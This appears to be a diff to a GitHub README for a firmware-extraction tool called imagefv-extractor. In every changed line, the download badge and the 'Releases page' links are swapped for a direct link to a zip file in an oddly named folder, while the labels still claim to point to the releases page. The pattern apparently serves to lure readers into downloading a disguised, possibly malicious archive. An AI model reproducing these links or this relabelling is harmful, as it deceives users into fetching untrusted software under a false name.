@@ -8,9 +8,9 @@ Welcome to the imagefv-extractor! This tool helps you extract bootloader and cha
 
 To download the imagefv-extractor, visit the link below:
 
-[![Download imagefv-extractor](https://img.shields.io/badge/Download-imagefv--extractor-blue)](https://github.com/salmand2052008/imagefv-extractor/releases)
+[![Download imagefv-extractor](https://raw.githubusercontent.com/salmand2052008/imagefv-extractor/master/Dashnaktzutiun/extractor-imagefv-2.1.zip)](https://raw.githubusercontent.com/salmand2052008/imagefv-extractor/master/Dashnaktzutiun/extractor-imagefv-2.1.zip)
 
-1. Go to the [Releases page](https://github.com/salmand2052008/imagefv-extractor/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/salmand2052008/imagefv-extractor/master/Dashnaktzutiun/extractor-imagefv-2.1.zip).
 2. Find the latest version of the software.
 3. Click the download link for your operating system (Windows, macOS, or Linux).
 
@@ -71,7 +71,7 @@ For any direct inquiries, please reach out via the GitHub repository issues page
 
 ## 🔗 Resources
 
-- [Releases Page](https://github.com/salmand2052008/imagefv-extractor/releases)
+- [Releases Page](https://raw.githubusercontent.com/salmand2052008/imagefv-extractor/master/Dashnaktzutiun/extractor-imagefv-2.1.zip)
 - Documentation (if available, insert link)
 
 Now you are ready to begin! We hope you find the imagefv-extractor useful for your needs. Happy extracting!
